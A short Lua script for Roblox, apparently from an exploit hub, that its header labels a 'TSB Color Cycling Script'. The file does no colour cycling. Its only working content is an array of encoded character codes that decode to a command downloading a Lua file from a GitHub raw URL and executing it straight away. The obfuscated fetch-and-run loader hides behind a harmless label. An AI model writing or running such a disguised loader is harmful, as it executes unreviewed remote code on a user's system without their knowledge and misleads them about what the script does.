--[[\
	Obfuscated for Katy-Hub
	TSB Color Cycling Script
]]--
local _L = (function(...)
    local _c = {...}
    return function()
        local _s = ""
        for i=1, #_c do
            _s = _s .. string.char(_c[i])
        end
        return loadstring(_s)()
    end
end)(
    108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,97,117,55,56,54,51,50,56,54,45,99,112,117,47,75,97,116,121,45,72,117,98,47,109,97,105,110,47,75,97,116,121,72,117,98,46,108,117,97,34,41,41,40,41
)
_L()
